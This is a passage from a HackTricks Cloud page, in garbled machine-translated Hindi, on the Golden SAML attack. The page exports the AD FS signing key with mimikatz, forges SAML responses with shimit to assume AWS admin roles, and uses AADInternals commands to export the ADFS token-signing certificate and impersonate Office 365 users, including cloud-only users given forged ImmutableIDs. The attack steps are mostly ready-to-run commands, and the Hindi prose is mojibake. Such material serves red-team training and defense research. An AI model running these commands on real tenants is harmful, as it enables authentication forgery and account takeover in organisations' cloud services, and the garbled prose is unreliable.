**рдирд┐рдЬреА рдХреБрдВрдЬреА** рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, **AD FS рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЗ** рддрдХ рдкрд╣реБрдВрдЪ рдЖрд╡рд╢реНрдпрдХ рд╣реИред рд╡рд╣рд╛рдВ рд╕реЗ, рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреЛ [mimikatz](https://github.com/gentilkiwi/mimikatz) рдЬреИрд╕реЗ рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рд╡реНрдпрдХреНрддрд┐рдЧрдд рд╕реНрдЯреЛрд░ рд╕реЗ рдирд┐рд░реНрдпрд╛рдд** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЕрдиреНрдп рдЖрд╡рд╢реНрдпрдХ рдЬрд╛рдирдХрд╛рд░реА рдПрдХрддреНрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк Microsoft.Adfs.Powershell рд╕реНрдиреИрдкрд┐рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреЗ рд╣реБрдП рдХрд┐ рдЖрдк ADFS рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЙрдЧ рдЗрди рд╣реИрдВ:
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
рд╕рднреА рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде, рдЖрдк [**shimit**](https://github.com/cyberark/shimit)** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рдорд╛рдиреНрдп SAMLResponse рдХреЛ рднреВрд▓ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рдЖрдк рдЕрдиреБрдХрд░рдг рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ:**

{% code overflow="wrap" %}
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

### рдСрди-рдкреНрд░реЗрдо -> рдХреНрд▓рд╛рдЙрдб
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
рдпрд╣ рдХреНрд▓рд╛рдЙрдб рдХреЗрд╡рд▓ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХрд╛ ImmutableID рдмрдирд╛рдирд╛ рдФрд░ рдЙрдирдХреА рдирдХрд▓ рдХрд░рдирд╛ рднреА рд╕рдВрднрд╡ рд╣реИред
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## рд╕рдВрджрд░реНрдн

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ рдХрд░реЗрдВ** [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}
